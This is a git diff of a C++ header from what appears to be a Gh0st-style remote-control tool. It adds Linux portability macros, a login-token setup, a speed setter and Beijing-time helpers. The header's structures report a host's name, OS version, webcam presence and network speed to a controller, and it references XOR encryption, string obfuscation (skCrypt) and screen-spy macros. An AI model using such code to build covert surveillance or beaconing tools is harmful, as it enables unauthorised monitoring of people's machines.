@@ -1,5 +1,63 @@
 #pragma once
 
+#include <vector>
+#include <string>
+#include <iosfwd>
+#include <iostream>
+#include <sstream>
+#include <string.h>
+#include <map>
+#include <numeric> 
+#include <ctime>
+#include <chrono>
+
+#ifdef _WIN32
+#include <concrt.h>
+#include <corecrt_io.h>
+#define MVirtualFree(a1, a2, a3) VirtualFree(a1, a2, a3)
+#define MVirtualAlloc(a1, a2, a3, a4) VirtualAlloc(a1, a2, a3, a4)
+#else // 使得该头文件在 LINUX 正常使用
+#include <thread>
+#define strcat_s strcat
+#define sprintf_s sprintf
+#define strcpy_s strcpy
+#define __stdcall 
+#define WINAPI 
+#define TRUE 1
+#define FALSE 0
+#define skCrypt(p)
+#define Mprintf printf
+#define ASSERT(p)
+#define AUTO_TICK_C(p)
+#define AUTO_TICK(p)
+#define OutputDebugStringA(p) printf(p)
+
+#include <unistd.h>
+#define Sleep(n) ((n) >= 1000 ? sleep((n) / 1000) : usleep((n) * 1000))
+
+typedef int64_t __int64;
+typedef uint32_t DWORD;
+typedef int BOOL, SOCKET;
+typedef unsigned int ULONG;
+typedef unsigned int UINT;
+typedef void VOID;
+typedef unsigned char BYTE;
+typedef BYTE* PBYTE, * LPBYTE;
+typedef void* LPVOID, * HANDLE;
+
+#define GET_PROCESS(a1, a2) 
+#define MVirtualFree(a1, a2, a3) delete[]a1
+#define MVirtualAlloc(a1, a2, a3, a4) new BYTE[a2]
+#define CopyMemory memcpy
+#define MoveMemory memmove
+
+#define INVALID_SOCKET -1
+#define SOCKET_ERROR -1
+#define closesocket close
+#define CloseHandle(p)
+#define CancelIo(p) close(reinterpret_cast<intptr_t>(p))
+#endif
+
 #include <string>
 #include <vector>
 #include <time.h>
@@ -193,17 +251,22 @@ typedef struct  LOGIN_INFOR
 {
 	unsigned char			bToken;									// 1.登陆信息
 	char					OsVerInfoEx[156];						// 2.版本信息
-	unsigned long			dwCPUMHz;								// 3.CPU主频
+	unsigned int			dwCPUMHz;								// 3.CPU主频
 	char					moduleVersion[24];						// 4.DLL模块版本
 	char					szPCName[_MAX_PATH];					// 5.主机名
 	int						bWebCamIsExist;							// 6.是否有摄像头
-	unsigned long			dwSpeed;								// 7.网速
+	unsigned int			dwSpeed;								// 7.网速
 	char					szStartTime[20];						// 8.启动时间
 	char					szReserved[512];						// 9.保留字段
 
 	LOGIN_INFOR(){
 		memset(this, 0, sizeof(LOGIN_INFOR));
+		bToken = TOKEN_LOGIN;
 		strcpy_s(moduleVersion, DLL_VERSION);
+	}
+	LOGIN_INFOR& Speed(unsigned long speed) {
+		dwSpeed = speed;
+		return *this;
 	}
 }LOGIN_INFOR;
 
@@ -215,10 +278,52 @@ inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<
 	}
 }
 
+inline std::tm ToPekingTime(const time_t* t) {
+	// 获取当前时间（如果传入的指针为空）
+	std::time_t now = (t == nullptr) ? std::time(nullptr) : *t;
+
+	// 线程安全地转换为 UTC 时间
+	std::tm utc_time{};
+
+#ifdef _WIN32  // Windows 使用 gmtime_s
+	if (gmtime_s(&utc_time, &now) != 0) {
+		return { 0, 0, 0, 1, 0, 100 }; // 失败时返回 2000-01-01 00:00:00
+	}
+#else  // Linux / macOS 使用 gmtime_r
+	if (gmtime_r(&now, &utc_time) == nullptr) {
+		return { 0, 0, 0, 1, 0, 100 };
+	}
+#endif
+
+	// 转换为北京时间（UTC+8）
+	utc_time.tm_hour += 8;
+
+	// 规范化时间（处理溢出，如跨天）
+	std::mktime(&utc_time);
+
+	return utc_time;
+}
+
+inline std::string ToPekingTimeAsString(const time_t* t) {
+	auto pekingTime = ToPekingTime(t);
+	char buffer[20];
+	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &pekingTime);
+	return buffer;
+}
+
 #ifdef _DEBUG
 // 为了解决远程桌面屏幕花屏问题而定义的宏，仅调试时使用，正式版本没有
 #define SCREENYSPY_IMPROVE 0
 #define SCREENSPY_WRITE 0
+#endif
+
+#ifdef _WIN32
+
+#ifdef _WINDOWS
+#include <afxwin.h>
+#else
+#define WIN32_LEAN_AND_MEAN 
+#include <windows.h>
 #endif
 
 // 将内存中的位图写入文件
@@ -246,13 +351,6 @@ inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::st
 	return false;
 }
 
-#ifdef _WIN32
-#ifdef _WINDOWS
-#include <afxwin.h>
-#else
-#define WIN32_LEAN_AND_MEAN 
-#include <windows.h>
-#endif
 class MSG32 { // 自定义控制消息(32位)
 public:
 	uint32_t            hwnd;
